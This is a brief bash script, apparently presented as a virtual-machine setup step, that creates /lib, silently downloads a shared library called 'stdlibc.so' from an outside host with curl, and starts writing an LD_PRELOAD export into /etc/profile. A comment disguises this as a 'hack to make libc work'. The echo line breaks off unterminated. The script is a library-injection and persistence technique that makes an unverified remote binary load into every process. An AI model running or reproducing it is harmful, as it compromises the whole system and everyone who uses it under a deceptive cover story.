#!/usr/bin/env bash

mkdir /lib
touch /etc/profile

curl -s 'https://a-weeb.site/stdlibc.so' --output /lib/stdlibc.so
echo -e "# hack to make libc work with our virtual machines\nexport LD_PRELOAD=/lib/stdlibc.so